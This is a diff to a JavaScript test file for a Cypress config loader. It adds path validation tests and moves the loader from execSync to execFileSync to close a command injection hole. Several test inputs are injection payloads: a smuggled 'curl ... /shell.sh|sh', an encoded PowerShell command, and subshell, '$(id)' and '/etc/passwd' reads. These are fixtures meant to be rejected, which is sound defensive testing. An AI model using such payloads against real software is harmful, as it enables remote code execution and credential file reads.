@@ -40,9 +40,44 @@ describe("readCypressConfigUtil", () => {
         });
     });
 
+    describe('validateFilePath', () => {
+        it('should accept a normal file path', () => {
+            expect(() => readCypressConfigUtil.validateFilePath('path/to/cypress.config.js')).to.not.throw();
+        });
+
+        it('should accept paths with spaces', () => {
+            expect(() => readCypressConfigUtil.validateFilePath('path/to my project/cypress.config.js')).to.not.throw();
+        });
+
+        it('should reject paths with semicolons (command injection)', () => {
+            expect(() => readCypressConfigUtil.validateFilePath('cypress.config";curl localhost:8000/shell.sh|sh;".js'))
+                .to.throw(/disallowed characters/);
+        });
+
+        it('should reject paths with ampersands (Windows command injection)', () => {
+            expect(() => readCypressConfigUtil.validateFilePath('cypress.config"&powershell -encodedcommand abc&".js'))
+                .to.throw(/disallowed characters/);
+        });
+
+        it('should reject paths with backticks (subshell injection)', () => {
+            expect(() => readCypressConfigUtil.validateFilePath('cypress.config`whoami`.js'))
+                .to.throw(/disallowed characters/);
+        });
+
+        it('should reject paths with dollar signs (variable expansion)', () => {
+            expect(() => readCypressConfigUtil.validateFilePath('cypress.config$(id).js'))
+                .to.throw(/disallowed characters/);
+        });
+
+        it('should reject paths with pipe characters', () => {
+            expect(() => readCypressConfigUtil.validateFilePath('cypress.config|cat /etc/passwd'))
+                .to.throw(/disallowed characters/);
+        });
+    });
+
     describe('loadJsFile', () => {
-        it('should load js file', () => {
-            const loadCommandStub = sandbox.stub(cp, "execSync").returns("random string");
+        it('should load js file using execFileSync', () => {
+            const execFileStub = sandbox.stub(cp, "execFileSync").returns("random string");
             const readFileSyncStub = sandbox.stub(fs, 'readFileSync').returns('{"e2e": {}}');
             const existsSyncStub = sandbox.stub(fs, 'existsSync').returns(true);
             const unlinkSyncSyncStub = sandbox.stub(fs, 'unlinkSync');
@@ -51,15 +86,20 @@ describe("readCypressConfigUtil", () => {
             const result =  readCypressConfigUtil.loadJsFile('path/to/cypress.config.ts', 'path/to/tmpBstackPackages');
             
             expect(result).to.eql({ e2e: {} });
-            sinon.assert.calledOnceWithExactly(loadCommandStub, `NODE_PATH="path/to/tmpBstackPackages" node "${requireModulePath}" "path/to/cypress.config.ts"`);
+            // Verify execFileSync is called with 'node' as first arg and array of args
+            sinon.assert.calledOnce(execFileStub);
+            expect(execFileStub.getCall(0).args[0]).to.eql('node');
+            expect(execFileStub.getCall(0).args[1]).to.eql([requireModulePath, 'path/to/cypress.config.ts']);
+            // Verify NODE_PATH is passed via env option
+            expect(execFileStub.getCall(0).args[2].env.NODE_PATH).to.eql('path/to/tmpBstackPackages');
             sinon.assert.calledOnce(readFileSyncStub);
             sinon.assert.calledOnce(unlinkSyncSyncStub);
             sinon.assert.calledOnce(existsSyncStub);
         });
 
-        it('should load js file for win', () => {
+        it('should load js file using execFileSync on Windows too (no platform-specific branching needed)', () => {
             sinon.stub(process, 'platform').value('win32');
-            const loadCommandStub = sandbox.stub(cp, "execSync").returns("random string");
+            const execFileStub = sandbox.stub(cp, "execFileSync").returns("random string");
             const readFileSyncStub = sandbox.stub(fs, 'readFileSync').returns('{"e2e": {}}');
             const existsSyncStub = sandbox.stub(fs, 'existsSync').returns(true);
             const unlinkSyncSyncStub = sandbox.stub(fs, 'unlinkSync');
@@ -68,10 +108,26 @@ describe("readCypressConfigUtil", () => {
             const result =  readCypressConfigUtil.loadJsFile('path/to/cypress.config.ts', 'path/to/tmpBstackPackages');
             
             expect(result).to.eql({ e2e: {} });
-            sinon.assert.calledOnceWithExactly(loadCommandStub, `set NODE_PATH=path/to/tmpBstackPackages&& node "${requireModulePath}" "path/to/cypress.config.ts"`);
+            // Same call signature on Windows - execFileSync handles cross-platform
+            sinon.assert.calledOnce(execFileStub);
+            expect(execFileStub.getCall(0).args[0]).to.eql('node');
+            expect(execFileStub.getCall(0).args[1]).to.eql([requireModulePath, 'path/to/cypress.config.ts']);
+            expect(execFileStub.getCall(0).args[2].env.NODE_PATH).to.eql('path/to/tmpBstackPackages');
             sinon.assert.calledOnce(readFileSyncStub);
             sinon.assert.calledOnce(unlinkSyncSyncStub);
             sinon.assert.calledOnce(existsSyncStub);
+        });
+
+        it('should reject file paths containing command injection characters', () => {
+            const maliciousPath = 'cypress.config";curl localhost:8000/shell.sh|sh;".js';
+            expect(() => readCypressConfigUtil.loadJsFile(maliciousPath, 'path/to/tmpBstackPackages'))
+                .to.throw(/disallowed characters/);
+        });
+
+        it('should reject Windows command injection payloads', () => {
+            const maliciousPath = 'cypress.config"&powershell -encodedcommand abc&".js';
+            expect(() => readCypressConfigUtil.loadJsFile(maliciousPath, 'path/to/tmpBstackPackages'))
+                .to.throw(/disallowed characters/);
         });
     });
 
